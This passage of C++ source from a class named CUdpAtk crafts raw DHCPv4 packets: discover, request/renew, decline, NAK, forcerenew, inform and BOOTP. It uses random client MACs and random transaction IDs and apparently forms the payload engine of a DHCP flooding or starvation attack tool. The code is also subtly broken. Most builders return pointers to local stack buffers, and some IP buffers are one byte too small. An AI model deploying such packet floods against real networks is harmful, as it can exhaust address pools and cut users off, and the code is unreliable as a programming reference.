	char stationary[9] = "01010601";  //记录msg_type, hardware_type, hardware_address, hops的数据
	char transacation_id[9] = {0};
	char metachar[] = "0123456789abcdef";
	srand((unsigned) time(NULL));
	for (int i = 0; i < 8; i++)
	{
		transacation_id[i] = metachar[(rand()+this->m_curcnt_total) % 16];
	}
	char secs_flags_ciaddr_yiaddr_siaddr[33] = "00000000000000000000000000000000"; 
	uint32_t src_ip;
	src_ip = get_cur_srcaddr();
	char relay_ip[9] = {0};   //中继的ip地址与输入源IP地址一样
	sprintf(relay_ip, "%08x", src_ip);

	char padding_client_mac[21] = "00000000000000000000";
	char server_name[129] = "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	char boot_file[257]="0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	char magic_cookie[9] = "63825363";

	/*dhcp decline请求类型值*/
	char option_dhcp_msg_type[7] = "350104";
	/*构造request IP address*/
	char option_request_ip_address[13] = {0};
	char option_request_ip_address_value[3] = "32";
	char option_request_ip_address_len[3] = "04";
	strcat(option_request_ip_address, option_request_ip_address_value);
	strcat(option_request_ip_address, option_request_ip_address_len);
	char client_ip_address[9] = {0};
	char tmp_client_ip_address[16] = {0};
	strncpy(tmp_client_ip_address, m_params.m_ipv4_address, sizeof(tmp_client_ip_address));
	ip_address_hex(tmp_client_ip_address, client_ip_address);
	strcat(option_request_ip_address, client_ip_address);
	//strcat(option_request_ip_address, m_params.m_ipv4_address);
	/*dhcpv4报文结束符*/
	char option_end[3] = "ff";

	char payload[1024] = {0};
	strcat(payload, stationary);
	strcat(payload, transacation_id);
	strcat(payload, secs_flags_ciaddr_yiaddr_siaddr);

	strcat(payload, relay_ip);
	// printf("payload:%s\n", payload);
	strcat(payload, client_mac);
	// printf("payload:%s\n", payload);
	strcat(payload, padding_client_mac);
	strcat(payload, server_name);
	strcat(payload, boot_file);
	strcat(payload, magic_cookie);
	strcat(payload, option_dhcp_msg_type);
	strcat(payload, option_request_ip_address);
	strcat(payload, m_params.m_options);
	strcat(payload, option_end);
	//printf("payload:%s\n", payload);
	return payload;
}

char* CUdpAtk::struct_renew_packet_v4(char* client_mac)  //dhcpv4续约报文构造
{
	char stationary[9] = "01010601";  //记录msg_type, hardware_type, hardware_address, hops的数据
	char transacation_id[9] = {0};
	char metachar[] = "0123456789abcdef";
	srand((unsigned) time(NULL));
	for (int i = 0; i < 8; i++)
	{
		transacation_id[i] = metachar[(rand()+this->m_curcnt_total) % 16];
	}
	char secs_flags_ciaddr_yiaddr_siaddr[33] = {0}; 
	
	char seconds_elapsed[9] = "00000000";
	char client_ip_address[8] = {0};
	char tmp_client_ip_address[16] = {0};
	strncpy(tmp_client_ip_address, m_params.m_ipv4_address, sizeof(tmp_client_ip_address));
	ip_address_hex(tmp_client_ip_address, client_ip_address);
	//printf("m_ipv4_address:%s, client_ip_address:%s\n", m_params.m_ipv4_address, client_ip_address);
	char your_client_ip_address[9] = "00000000";
	char next_server_ip_address[9] = "00000000";
	strcat(secs_flags_ciaddr_yiaddr_siaddr, seconds_elapsed);
	strcat(secs_flags_ciaddr_yiaddr_siaddr, client_ip_address);
	strcat(secs_flags_ciaddr_yiaddr_siaddr, your_client_ip_address);
	strcat(secs_flags_ciaddr_yiaddr_siaddr, next_server_ip_address);

	uint32_t src_ip;
	src_ip = get_cur_srcaddr();
	char relay_ip[9] = {0};   //中继的ip地址与输入源IP地址一样
	sprintf(relay_ip, "%08x", src_ip);

	char padding_client_mac[21] = "00000000000000000000";
	char server_name[129] = "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	char boot_file[257]="0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	char magic_cookie[9] = "63825363";

	char option_dhcp_msg_type[7] = "350103"; //optiron 53, DHCP类型为request, 值为3
	char option_parameter_list[31] = "370d011c02790f060c28292a1a7703";
	char option_end[3] = "ff";  //option的结束符
	// /*获取server id*/
	// char option_server_id[13] = {0};
	// strncpy(option_server_id, m_params.m_server_id_duid, sizeof(m_params.m_server_id_duid));


	char payload[1024] = {0};
	strcat(payload, stationary);
	strcat(payload, transacation_id);
	strcat(payload, secs_flags_ciaddr_yiaddr_siaddr);

	strcat(payload, relay_ip);
	// printf("payload:%s\n", payload);
	strcat(payload, client_mac);
	// printf("payload:%s\n", payload);
	strcat(payload, padding_client_mac);
	strcat(payload, server_name);
	strcat(payload, boot_file);
	strcat(payload, magic_cookie);
	strcat(payload, option_dhcp_msg_type);
	strcat(payload, m_params.m_options);
	strcat(payload, option_parameter_list);
	strcat(payload, option_end);
	return payload;
}

char* CUdpAtk::struct_bootp_packet_v4(char* client_mac)  //dhcpv4续约报文构造
{
	/*
		构造bootp报文
	*/
	char stationary[9] = "01010601";  //记录msg_type, hardware_type, hardware_address, hops的数据
	char transacation_id[9] = {0};
	char metachar[] = "0123456789abcdef";
	srand((unsigned) time(NULL));
	for (int i = 0; i < 8; i++)
	{
		transacation_id[i] = metachar[(rand()+this->m_curcnt_total) % 16];
	}
	char secs_flags_ciaddr_yiaddr_siaddr[33] = {0}; 
	
	char seconds_elapsed[9] = "00000000";
	char client_ip_address[8] = {0};
	char tmp_client_ip_address[16] = {0};
	strncpy(tmp_client_ip_address, m_params.m_ipv4_address, sizeof(tmp_client_ip_address));
	ip_address_hex(tmp_client_ip_address, client_ip_address);
	//printf("m_ipv4_address:%s, client_ip_address:%s\n", m_params.m_ipv4_address, client_ip_address);
	char your_client_ip_address[9] = "00000000";
	char next_server_ip_address[9] = "00000000";
	strcat(secs_flags_ciaddr_yiaddr_siaddr, seconds_elapsed);
	strcat(secs_flags_ciaddr_yiaddr_siaddr, client_ip_address);
	strcat(secs_flags_ciaddr_yiaddr_siaddr, your_client_ip_address);
	strcat(secs_flags_ciaddr_yiaddr_siaddr, next_server_ip_address);

	uint32_t src_ip;
	src_ip = get_cur_srcaddr();
	char relay_ip[9] = {0};   //中继的ip地址与输入源IP地址一样
	sprintf(relay_ip, "%08x", src_ip);

	char padding_client_mac[21] = "00000000000000000000";
	char server_name[129] = "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	char boot_file[257]="0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";

	// char option_server_id[13] = {0};
	// strncpy(option_server_id, m_params.m_server_id_duid, sizeof(m_params.m_server_id_duid));

	char payload[1024] = {0};
	strcat(payload, stationary);
	strcat(payload, transacation_id);
	strcat(payload, secs_flags_ciaddr_yiaddr_siaddr);

	strcat(payload, relay_ip);
	// printf("payload:%s\n", payload);
	strcat(payload, client_mac);
	// printf("payload:%s\n", payload);
	strcat(payload, padding_client_mac);
	strcat(payload, server_name);
	strcat(payload, boot_file);

	return payload;
}

char* CUdpAtk::struct_discover_packet_v4(char* client_mac)
{
	char stationary[9] = "01010601";  //记录msg_type, hardware_type, hardware_address, hops的数据
	char transacation_id[9] = {0};
	char metachar[] = "0123456789abcdef";
	srand((unsigned) time(NULL));
	for (int i = 0; i < 8; i++)
	{
		transacation_id[i] = metachar[(rand()+this->m_curcnt_total) % 16];
	}
	char secs_flags_ciaddr_yiaddr_siaddr[33] = "00000000000000000000000000000000"; 
	uint32_t src_ip;
	src_ip = get_cur_srcaddr();

	char relay_ip[9] = {0};   //中继的ip地址与输入源IP地址一样
	if(strlen(m_params.m_relay_ip)!=0){
		char tmp_client_ip_address[16] = {0};
		strncpy(tmp_client_ip_address, m_params.m_relay_ip, sizeof(tmp_client_ip_address));
		ip_address_hex(tmp_client_ip_address, relay_ip);
	}
	else
	{
		sprintf(relay_ip, "%08x", src_ip);
	}

	char padding_client_mac[21] = "00000000000000000000";
	char server_name[129] = "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	char boot_file[257]="0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	char magic_cookie[9] = "63825363";

	char option_dhcp_msg_type[7] = "350101";
	//option55报文内容
	char option_parameter_list[31] = "370d011c02790f060c28292a1a7703";
	char option_end[3] = "ff";


	char payload[1024] = {0};
	strcat(payload, stationary);
	strcat(payload, transacation_id);
	strcat(payload, secs_flags_ciaddr_yiaddr_siaddr);

	strcat(payload, relay_ip);
	// printf("payload:%s\n", payload);
	strcat(payload, client_mac);
	// printf("payload:%s\n", payload);
	strcat(payload, padding_client_mac);
	strcat(payload, server_name);
	strcat(payload, boot_file);
	strcat(payload, magic_cookie);
	strcat(payload, option_dhcp_msg_type);
	strcat(payload, option_parameter_list);
	strcat(payload, m_params.m_options);
	strcat(payload, option_end);
	return payload;
}


char* CUdpAtk::struct_forcerenew_packet_v4(char* client_mac)
{
	char stationary[9] = "01010601";  //记录msg_type, hardware_type, hardware_address, hops的数据
	char transacation_id[9] = {0};
	char metachar[] = "0123456789abcdef";
	srand((unsigned) time(NULL));
	for (int i = 0; i < 8; i++)
	{
		transacation_id[i] = metachar[(rand()+this->m_curcnt_total) % 16];
	}
	char secs_flags_ciaddr_yiaddr_siaddr[33] = "00000000000000000000000000000000"; 
	uint32_t src_ip;
	src_ip = get_cur_srcaddr();
	char relay_ip[9] = {0};   //中继的ip地址与输入源IP地址一样
	sprintf(relay_ip, "%08x", src_ip);

	char padding_client_mac[21] = "00000000000000000000";
	char server_name[129] = "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	char boot_file[257]="0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	char magic_cookie[9] = "63825363";

	char option_dhcp_msg_type[7] = "350109";
	// char option_parameter_list[31] = "370d011c02790f060c28292a1a7703";
	char option_end[3] = "ff";


	char payload[1024] = {0};
	strcat(payload, stationary);
	strcat(payload, transacation_id);
	strcat(payload, secs_flags_ciaddr_yiaddr_siaddr);

	strcat(payload, relay_ip);
	// printf("payload:%s\n", payload);
	strcat(payload, client_mac);
	// printf("payload:%s\n", payload);
	strcat(payload, padding_client_mac);
	strcat(payload, server_name);
	strcat(payload, boot_file);
	strcat(payload, magic_cookie);
	strcat(payload, option_dhcp_msg_type);
	// strcat(payload, option_parameter_list);
	strcat(payload, m_params.m_options);
	strcat(payload, option_end);
	return payload;
}

char* CUdpAtk::struct_nak_packet_v4(char* client_mac)
{
	char stationary[9] = "01010601";  //记录msg_type, hardware_type, hardware_address, hops的数据
	char transacation_id[9] = {0};
	char metachar[] = "0123456789abcdef";
	srand((unsigned) time(NULL));
	for (int i = 0; i < 8; i++)
	{
		transacation_id[i] = metachar[(rand()+this->m_curcnt_total) % 16];
	}
	char secs_flags_ciaddr_yiaddr_siaddr[33] = "00000000000000000000000000000000"; 
	uint32_t src_ip;
	src_ip = get_cur_srcaddr();
	char relay_ip[9] = {0};   //中继的ip地址与输入源IP地址一样
	sprintf(relay_ip, "%08x", src_ip);

	char padding_client_mac[21] = "00000000000000000000";
	char server_name[129] = "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	char boot_file[257]="0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	char magic_cookie[9] = "63825363";

	char option_dhcp_msg_type[7] = "350106";
	// char option_parameter_list[31] = "370d011c02790f060c28292a1a7703";
	char option_end[3] = "ff";


	char payload[1024] = {0};
	strcat(payload, stationary);
	strcat(payload, transacation_id);
	strcat(payload, secs_flags_ciaddr_yiaddr_siaddr);

	strcat(payload, relay_ip);
	// printf("payload:%s\n", payload);
	strcat(payload, client_mac);
	// printf("payload:%s\n", payload);
	strcat(payload, padding_client_mac);
	strcat(payload, server_name);
	strcat(payload, boot_file);
	strcat(payload, magic_cookie);
	strcat(payload, option_dhcp_msg_type);
	// strcat(payload, option_parameter_list);
	strcat(payload, m_params.m_options);
	strcat(payload, option_end);
	return payload;
}

char* CUdpAtk::struct_inform_packet_v4(char* client_mac)
{
	char stationary[9] = "01010601";  //记录msg_type, hardware_type, hardware_address, hops的数据
	char transacation_id[9] = {0};
	char metachar[] = "0123456789abcdef";
	srand((unsigned) time(NULL));
	for (int i = 0; i < 8; i++)
	{
		transacation_id[i] = metachar[(rand()+this->m_curcnt_total) % 16];
	}
	char secs_flags_ciaddr_yiaddr_siaddr[33] = "00000000000000000000000000000000"; 
	uint32_t src_ip;
	src_ip = get_cur_srcaddr();
	char relay_ip[9] = {0};   //中继的ip地址与输入源IP地址一样
	sprintf(relay_ip, "%08x", src_ip);

	char padding_client_mac[21] = "00000000000000000000";
	char server_name[129] = "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	char boot_file[257]="0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	char magic_cookie[9] = "63825363";

	char option_dhcp_msg_type[7] = "350108";
	char option_parameter_list[31] = "370d011c02790f060c28292a1a7703";
	char option_end[3] = "ff";


	char payload[1024] = {0};
	strcat(payload, stationary);
	strcat(payload, transacation_id);
	strcat(payload, secs_flags_ciaddr_yiaddr_siaddr);

	strcat(payload, relay_ip);
	// printf("payload:%s\n", payload);
	strcat(payload, client_mac);
	// printf("payload:%s\n", payload);
	strcat(payload, padding_client_mac);
	strcat(payload, server_name);
	strcat(payload, boot_file);
	strcat(payload, magic_cookie);
	strcat(payload, option_dhcp_msg_type);
	strcat(payload, option_parameter_list);
	strcat(payload, m_params.m_options);
	strcat(payload, option_end);
	return payload;
}

char* CUdpAtk::get_udp_payload()
{
	
	//char *stationary;
	//delete[] stationary;
	char payload[1024] = {0};
	
	char stationary[9] = "01010601";
	//stationary = "01010601";
	/*产生随机的transacation_id*/
	char transacation_id[9] = {0};
	char metachar[] = "0123456789abcdef";
	srand((unsigned) time(NULL));
	for (int i = 0; i < 8; i++)
	{
		transacation_id[i] = metachar[(rand()+this->m_curcnt_total) % 16];
	}
			
	char secs_flags_ciaddr_yiaddr_siaddr[33] = "00000000000000000000000000000000";
	
	char client_mac[13] ={0}; //mac为16字节，128位=32*		
	this->get_random_mac(client_mac);
	
	uint32_t src_ip;
	src_ip = get_cur_srcaddr();
	//printf("src_ip:%d\n", src_ip);
	char relay_ip[9] = {0};   //中继的ip地址与输入源IP地址一样
	sprintf(relay_ip, "%08x", src_ip);

	char padding_client_mac[21] = "00000000000000000000";
	char server_name[129] = "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	char boot_file[257]="0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	char magic_cookie[9] = "63825363";
	
	strcat(payload, stationary);
	strcat(payload, transacation_id);
	strcat(payload, secs_flags_ciaddr_yiaddr_siaddr);

	strcat(payload, relay_ip);
	// printf("payload:%s\n", payload);
	strcat(payload, client_mac);
	// printf("payload:%s\n", payload);
	strcat(payload, padding_client_mac);
	strcat(payload, server_name);
	strcat(payload, boot_file);
	strcat(payload, magic_cookie);
	strcat(payload, m_params.m_options);
	int pay_len;
	pay_len = strlen(payload);
	
	m_params.m_payload_len = pay_len/2+1;
	int flag;
	char * payload_data = NULL;
	
	payload_data = (char*)malloc(sizeof(char) * (pay_len/2 + 1) );
	flag= hex2str(payload_data, payload, pay_len);
	return payload_data;
}


pdu_l3_desc_t CUdpAtk::get_layer3_info()
{	
	pdu_l3_desc_t layer3;
	
	layer3.vlanid = m_params.m_vlan_id;
	layer3.dstaddr = get_cur_dstaddr();
	layer3.srcaddr = get_cur_srcaddr();
	layer3.dstaddr6 = get_cur_dstaddr6();
	layer3.srcaddr6 = get_cur_srcaddr6();	
	layer3.identity = m_params.m_identity;
	layer3.ttl = m_params.m_ttl;
	layer3.dont_frag = m_params.m_dont_frag;
	layer3.dport = get_cur_dstport();
	layer3.sport = get_cur_srcport();
	layer3.payload_len = m_params.m_payload_len;
	// printf("layer3.payload_len:%d\n", layer3.payload_len);
	layer3.ip_type = m_params.m_ip_type;
	layer3.iph_proto = m_params.m_iph_proto;
	layer3.layer3_total_len =  sizeof(UDP_HEADER_T) + m_params.m_payload_len;
	return layer3;
}


//构造报文存入buff中，如果buffer_len < ip头+udp头和负载信息的长度则构建失败
//
uint32_t CUdpAtk::modify_udp(pdu_l3_desc_t *pdu_desc, char *buffer, uint32_t buffer_len, char* payload)
{
    int send_len = 0;
    IP_HEADER_T *iphdr = NULL;
    UDP_HEADER_T *udphdr = NULL;
    send_len += copy_ip_header(buffer, buffer_len, pdu_desc);	
    udphdr = (UDP_HEADER_T*)&buffer[send_len];
    udphdr->th_sport = htons(pdu_desc->sport);
    udphdr->th_dport = htons(pdu_desc->dport);
    udphdr->th_len   = htons(sizeof(UDP_HEADER_T) + pdu_desc->payload_len);
    udphdr->th_sum = 0;

    send_len += sizeof(UDP_HEADER_T);

    if (pdu_desc->payload_len > 0)
    {
        if (payload != NULL)
        {   //RC_LOG_INFO("test4 %d",pdu_desc->payload_len );  
			util_memcpy(&buffer[send_len], payload, pdu_desc->payload_len);
			
        }
        else
        {
            /*payload不变*/ //当start中初始化以后 不再修改报文段
        }

        send_len +=  pdu_desc->payload_len;
    }
    iphdr = (IP_HEADER_T*)&buffer[0];
//    udphdr->th_sum = compute_udp_checksum(iphdr, udphdr, sizeof(UDP_HEADER_T) + pdu_desc->payload_len);
    return send_len;
}


void CUdpAtk::stop()
{
	common_free();
}


uint16_t CUdpAtk::compute_udp_checksum(IP_HEADER_T *ip_header, UDP_HEADER_T *udp_header, uint16_t udp_len)
{
    PSD_HEADER_T ph = {ip_header->sourceIP,
            ip_header->destIP,
            0,
            ip_header->proto,
            htons(udp_len)};

    return in_chksum_udp((uint16_t *)&ph, (uint16_t *)udp_header, udp_len);
}


// iphead layer3header
inline uint16_t CUdpAtk::in_chksum_udp(uint16_t *h, uint16_t *d, uint16_t dlen)
{
    unsigned int cksum;
    unsigned short answer = 0;

    // PseudoHeader must have 12 bytes
    cksum  = h[0];
    cksum += h[1];
    cksum += h[2];
    cksum += h[3];
    cksum += h[4];
    cksum += h[5];

    // UDP hdr must have 8 hdr bytes
    cksum += d[0];
    cksum += d[1];
    cksum += d[2];
    cksum += d[3];

    dlen  -= 8; // bytes
    d     += 4; // short's

    while(dlen >= 32)
    {
        cksum += d[0];
        cksum += d[1];
        cksum += d[2];
        cksum += d[3];
        cksum += d[4];
        cksum += d[5];
        cksum += d[6];
        cksum += d[7];
        cksum += d[8];
        cksum += d[9];
        cksum += d[10];
        cksum += d[11];
        cksum += d[12];
        cksum += d[13];
        cksum += d[14];
        cksum += d[15];
        d     += 16;
        dlen  -= 32;
    }

    while(dlen >= 8)
    {
        cksum += d[0];
        cksum += d[1];
        cksum += d[2];
        cksum += d[3];
        d     += 4;
        dlen  -= 8;
    }

    while(dlen > 1)
    {
        cksum += *d++;
        dlen  -= 2;
    }

    if( dlen == 1 )
    {
        *(unsigned char *)(&answer) = (*(unsigned char *)d);
        cksum += answer;
    }

    cksum  = (cksum >> 16) + (cksum & 0x0000ffff);
    cksum += (cksum >> 16);

    return (unsigned short)(~cksum);
}



